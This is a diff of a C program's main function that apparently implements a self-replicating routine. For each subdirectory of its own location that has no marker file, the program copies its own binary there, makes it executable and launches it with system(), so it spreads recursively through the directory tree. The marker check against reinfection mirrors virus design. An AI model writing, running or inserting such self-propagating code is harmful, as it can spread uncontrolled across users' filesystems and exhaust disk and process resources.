@@ -2,41 +2,55 @@
 
 int main (int argc, char **argv) {
 	char *program_name = NULL;
-	char current_dir[CURRENT_DIR_LEN];
-	char srcAbsPath[MAX];
-	char destAbsPath[MAX];
-	char *destFile = NULL;
+	char *dir_name = NULL;
+	char *program_fullpath = NULL;
+	char *dest_file = NULL;
+	char src_fullpath[MAX];
+	char dest_fullpath[MAX];
 	Directory *list = NULL;
 	Directory *it = NULL;
 
 	// init
 	program_name = basename(argv[0]);
-	memset(current_dir, 0, CURRENT_DIR_LEN);
-        getcwd(current_dir, CURRENT_DIR_LEN);
+	dir_name = dirname(argv[0]);
+	realpath(dir_name, src_fullpath);
+	program_fullpath = (char *) malloc(strlen(src_fullpath) + strlen(program_name) + 2);
+	strcpy(program_fullpath, src_fullpath);
+	strcat(program_fullpath, "/");
+	strcat(program_fullpath, program_name);
+	
+	// list directories	
 	list = (Directory *) malloc(sizeof(Directory));
-	memset(destAbsPath, 0, MAX);
-	realpath(argv[0], srcAbsPath);
-
-	// get all directories in the given path
-	listDirectories(list, current_dir);
+	listDirectories(list, dir_name);
 	it = list;
 	while (it != NULL && it->directory != NULL) {
-		destFile = (char *) malloc(strlen(it->directory) + strlen (program_name) + 2);
-		strcpy(destFile, it->directory);
-		strcat(destFile, "/");
-		strcat(destFile, program_name);
-		realpath(destFile, destAbsPath);
-		free(destFile);
+		dest_file = (char *) malloc(strlen(dir_name) + strlen(it->directory) + strlen (program_name) + 3);
+		strcpy(dest_file, dir_name);
+		strcat(dest_file, "/");
+		strcat(dest_file, it->directory);
+		strcat(dest_file, "/");
+		realpath(dest_file, dest_fullpath);
+		free(dest_file);
+		dest_file = (char *) malloc(strlen(dest_fullpath) + strlen(program_name) + 2);
+		strcpy(dest_file, dest_fullpath);
+		strcat(dest_file, "/");
+		strcat(dest_file, program_name);
+		
+		// if no marker in the destination directory, copy and exec program
+		if (checkMarker(dest_fullpath) == -1) {
+			copy(program_fullpath, dest_file);
+			setExecutable(dest_file);
+			system(dest_file);
+		}
 
-		copy(argv[0], destAbsPath);
-		setExecutable(destAbsPath);
-		execl(destAbsPath, NULL);
-
-		memset(destAbsPath, 0, MAX);
+		memset(dest_fullpath, 0, MAX);
+		free(dest_file);
 		it = it->next;
 	}
 
-	// free the list of Directory elements
-	freeList(list);		
+	// free dynamic allocation elements
+	freeList(list);
+	free(program_fullpath);
+
 	return 0;
 }
